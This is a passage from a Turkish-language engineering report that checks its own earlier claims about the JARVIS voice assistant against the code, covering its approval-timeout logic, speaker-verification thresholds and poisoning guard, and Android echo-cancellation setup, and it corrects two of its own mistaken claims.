**Yeniden araştırma tetikleyicileri:** Faz D'ye geçmeden önce (§6.6 telefoni), K3'ü açmadan önce (§2.3 küratör), tam düplekse geçmeden önce (§6.8), ve embedding değiştirmeden önce (§4.7).

---

## 8. Kod doğrulaması (5 Ağustos 2026)

§7.4'teki açık soruların 1–4'ü JARVIS kod tabanı üzerinden cevaplandı. **İki bulgu bu raporun iddialarını düzeltti** — ilgili bölümlere düzeltme kutuları eklendi.

### 8.1 Q1 — ADK session service ve tool confirmation

| | |
|---|---|
| **Kullanılan** | `InMemorySessionService` — `brain/app/main.py:85`, `brain/app/factory.py:471` |
| **Pin** | `brain/pyproject.toml:6` → `google-adk>=1.16,<2.0` · **kurulu: 1.36.2** |
| **Gerekçe kayıtlı** | `brain/app/messages.py:4` — *"ADK 1.36.2 offers no Firestore-native SessionService; see spec §12"* |

**Sonuç — engelleyici benim söylediğim yerde değil.** [§5.10 C](#510-yeniden-yazmayin)'de *"`DatabaseSessionService`/`VertexAiSessionService` kullanılıyorsa ADK'nın native tool confirmation'ı kullanılamaz"* demiştim. Session service o ikisinden biri **değil** — yani o kısıt bizi bağlamıyor. Ama gerçek engel daha basit ve daha sert:

> 🔴 **ADK native `require_confirmation` / `ToolContext.request_confirmation()` ADK **2.x** özelliğidir; proje `<2.0`'a pinli ve 1.36.2 kurulu. Bugün kullanılamaz — session service yüzünden değil, sürüm pini yüzünden.**

Bu, Y3'ün el yazısı onay merkezini **doğrulayan** bir bulgu: alternatif yoktu. Karar noktası ADK 2.x'e geçilirse yeniden değerlendirilir; o zaman `InMemorySessionService` engel çıkarmaz. *(Not: 1.36.2'ye pinli olmak ayrıca bir borç — `voice_trust.py`, `tool_registry.py` ve iki test dosyası davranışı "kurulu 1.36.2 kaynağından doğrulandı" diye kayıtlı, yani sürüm yükseltmesi bunları kırabilir.)*

### 8.2 Q2 — Onay merkezinde ret gerekçesi

**Ret gerekçesi YOK — [§5.9 P2](#59-çalinacak-fikirler-1) tam olarak uygulanabilir.**

`approvals.decide(db, approval_id, user_id, decision, executors=None, now_fn=_now)` — imzada `reason` / `comment` parametresi yok; `decision` yalnızca `DECISIONS` kümesinden bir değer. Yani HumanLayer'ın *"`Rejected` yorumsuz kurulamaz"* tip kısıtının karşılığı bizde yok, ve reddin **neden** reddedildiği modele geri gitmiyor.

**Buna karşılık zaman aşımı tarafı raporun iddia ettiğinden de sağlam çıktı — bunu kayda geçirmek gerekiyor:**
- `APPROVAL_TTL_MINUTES = 60` (config.py:163)
- Süre kontrolü **karar anında da uygulanıyor**, sadece süpürücüye bırakılmamış (`decide()`, satır 370) — dokümante edilmiş gerekçesiyle: *"süresi geçmiş bir onay claim bile üretmesin"*
- `_is_expired()` **fail-closed**: *"Okunamayan/eksik `expires_at` DOLMUŞ sayılır"*
- Süre dolduğunda `decided_by` **yazılmıyor** — *"kararı kimse vermedi, süre verdi"*
- Karar sırası sözleşme olarak yazılı: oku → sahiplik → pending mi → **SÜRE** → claim → status → yürüt

> [§5.8](#58-jarvisin-politika-katmani-bu-manzarada-nerede-duruyor)'de "zaman aşımı = reddet bizde var, HumanLayer ve LangGraph'ta yok" demiştim. **Kodda gördüğüm hâli iddiadan daha iyi:** fail-closed, karar-anı kontrollü, ve "kim karar verdi" alanını kirletmiyor. Bu, raporun bulduğu en olgun JARVIS bileşeni.

### 8.3 Q3 — Speaker-ID eşikleri ve kalibrasyon

🔴 **Brief'imdeki "0.72/0.16 eşikleri" YANLIŞTI.** Gerçek değerler (`brain/app/config.py:167-168`):

```python
SPEAKER_ACCEPT_THRESHOLD = 0.35   # JARVIS_SPEAKER_ACCEPT
SPEAKER_ADAPT_THRESHOLD  = 0.60   # JARVIS_SPEAKER_ADAPT
SPEAKER_TOPK             = 3
SPEAKER_ADAPTIVE_CAP     = 20
```

0.72/0.16 **ölçülen** değerlerdi — `brain/README.md:241`'in dediği gibi *"below the observed same-speaker match and above the observed impostor score"*, yani eşik değil gözlem.

**Kalibrasyon durumu — kodun kendi itirafı:**
- `config.py:165-166` — *"cosine thresholds are **starting estimates**, calibrated after enrollment (spec §15)"*
- `config.py:174` — *"the thresholds above were calibrated on ~3 s"*
- ❌ **AS-Norm yok, cohort yok, QMF yok, DET eğrisi yok** (arama: `asnorm|as_norm|score_norm|cohort|calibrat|impostor` → yalnız yorum ve test sabitleri)

→ [§6.11 S3](#611-çalinacak-fikirler-efor-tahminiyle-kişi-gün) (kalibrasyon hattı) **tam olarak geçerli.** Kalibrasyon bilinçli ertelenmiş bir borç, gizli bir hata değil — ama borç.

✅ **Beklemediğim iyi haber: [§6.4](#64-adaptif-galeri-güvenliği)'ün MARJ KURALI ZATEN UYGULANMIŞ.**

`speaker.py:198-202`:
> *"Two thresholds create a poisoning-guard band: accept <= score < adapt means 'trust it but don't learn from it'"*

Yani kimlik doğrulama eşiği (0.35) ile **galeriye yazma** eşiği (0.60) ayrı, ve aradaki bant bilinçli bir poisoning savunması. Üstüne üç koruma daha var:
- Galeriye yazma ayrıca **"authed as Kadir"** şartına bağlı (yalnız ses skoru yetmiyor)
- `SPEAKER_ADAPTIVE_CAP = 20` adaptif örnek sayısını sınırlıyor
- `_gallery_lock` — load→adapt→save read-modify-write yarışını serileştiriyor (`speaker.py:219-225`, gerekçesi yazılı)
- MANUAL örnekler ACCEPT'te oy kullanıyor ama adapt kararına **hakemlik etmiyor** (`speaker.py:370`)

→ **[§6.11 S2](#611-çalinacak-fikirler-efor-tahminiyle-kişi-gün)'nin 5 maddesinden biri (marj kuralı) DONE.** Kalan dördü hâlâ açık: **CM'in arkasına alma** (en kritik), **yön tutarlılığı izleme**, **drift bütçesi**, **geri alınabilir versiyonlu galeri**, **kanal başına alt-galeri**. Efor tahmini 3–4 günden ~2–3 güne düşer.

### 8.4 Q4 — Android ses hattı / AEC

🔴 **[§6.8](#68--barge-in--aec--telefon-istemcisindeki-en-önemli-bulgu)'in açılış iddiası ("AEC hiç devrede değil") YANLIŞTI.** Gerçek durum:

| Halka | Durum | Kanıt |
|---|---|---|
| Mikrofon source | ✅ `VOICE_COMMUNICATION` | `AndroidMicSource.kt:42` |
| STT source | ✅ `VOICE_COMMUNICATION` | `AndroidSpeechToText.kt:137-142` — **`RecognizerIntent.EXTRA_AUDIO_SOURCE` üzerinden** |
| TTS usage | ✅ `USAGE_VOICE_COMMUNICATION` | `AndroidTextToSpeech.kt:94` |
| Çıkış rotası | ✅ `setCommunicationDevice(hoparlör)`, kablolu/BLE kulaklık saygılı | `VoiceCallService.kt:89-116` |
| **`setMode(MODE_IN_COMMUNICATION)`** | ❌ **YOK** | aramada hiç geçmiyor |
| **`AcousticEchoCanceler.create().setEnabled()`** | ❌ **YOK** | aramada hiç geçmiyor |
| **AEC self-test (`getEffects()`)** | ❌ **YOK** | — |

Kodun kendi kaydı bu işin ne zaman ve neden yapıldığını da söylüyor (`AndroidSpeechToText.kt:132-135`):
> *"VOICE_COMMUNICATION = the AEC-enabled audio source (API 31+): without it the recognizer hears Jarvis's own TTS from the speaker, treats it as user speech, and barge-in kills every reply after a few words (prod report 2026-07-31: 'kendi sesi yüzünden dinleme moduna geçiyor')."*

**Yani AEC yolu 31 Temmuz'daki canlı hatadan sonra zaten kurulmuş.** §6.8'deki `VOICE_RECOGNITION` analizi geçmişin doğru açıklaması ama bugünün durumu değil.

**Kalan gerçek eksik — ve bu hâlâ önemli:**
> 🔴 **`AudioManager.setMode(MODE_IN_COMMUNICATION)` hiçbir yerde çağrılmıyor.** Araştırmanın bulgusuna göre AEC zincirini fiilen uyandıran anahtar budur; `setCommunicationDevice` yalnızca **rotayı** belirliyor. Yani AEC'in çalışıp çalışmadığı şu an **cihaz/OEM'e bağlı bir şans meselesi** — ve S23'te çalışıyor olması başka cihazda çalışacağı anlamına gelmiyor. **`getEffects()` self-test'i olmadan bunu ölçemeyiz de.**
> Ek: `setMode` eklenirse [§6.8](#68--barge-in--aec--telefon-istemcisindeki-en-önemli-bulgu)'deki **6 saniye reset tuzağı** devreye girer — sessiz track workaround'u ile birlikte planlanmalı.

⚠️ **Çözülmemiş çelişki:** Kod `EXTRA_AUDIO_SOURCE`'a bir **int** (`MediaRecorder.AudioSource.VOICE_COMMUNICATION`) geçiriyor ve yorumunda *"verified against the installed android-36 SDK"* diyor. Araştırma ajanı ise AOSP `RecognizerIntent.java`'ya dayanarak bu extra'nın bir **`ParcelFileDescriptor`** aldığını raporladı. İkisi aynı anda doğru olamaz. **Cihazda ölçülmeli** — eğer extra sessizce yok sayılıyorsa `SpeechRecognizer` kendi mikrofonunu `VOICE_RECOGNITION` ile açıyor olabilir ve STT tarafındaki AEC bir yanılsama olur. *(PCM yolu — `AndroidMicSource` — bundan bağımsız, orası doğrudan `AudioRecord` ile kuruluyor ve kesin.)*

### 8.5 Hâlâ açık kalanlar

| # | Soru | Neden koddan çıkmıyor |
|---|---|---|
| 5 | Asistan sesi Kadir'in sesinden mi klonlanacak? | **Tasarım kararı — Kadir'in.** Evetse PerTh filigranı zorunlu ([§6.10a](#610-jarvisin-en-kritik-açigi)) |
| 6 | XLS-R sınıfı CM Cloud Run CPU'sunda ne kadar sürüyor? | Ölçüm gerekiyor. Maliyet ve gecikme bütçesi buna bağlı |
| 7 | Wear OS'ta tr-TR TTS gerçekten var mı? | Cihazda `getAvailableLanguages()` testi gerekiyor — **Türkçe ön yüklü değil** ([§6.9](#69-wear-os-ses-tuzaklari)) |

### 8.6 Doğrulamanın kendisinden çıkan ders

Bu turda kendi raporumun iki iddiası çürüdü, ve ikisi de aynı sebepten: **araştırma ajanlarına verdiğim brief'i kodu okumadan yazmıştım.** "0.72/0.16 eşikler" hafızadan geldi ve yanlıştı; "cihaz-üstü `SpeechRecognizer`" doğruydu ama hangi audio source'la sorusunu hiç sormamıştım.

Aynı turda üç şey de **iddia ettiğimden iyi** çıktı: onay zaman aşımı (fail-closed + karar-anı kontrollü), poisoning marj bandı (zaten var), ve AEC yolu (zaten kurulu).

> **Kural:** dış araştırmayı kendi sistemin hakkındaki *hatırladığın* bilgiyle beslersen, dışarıdan gelen doğru bilgi bile yanlış yere oturur. Brief'i koddan yaz.
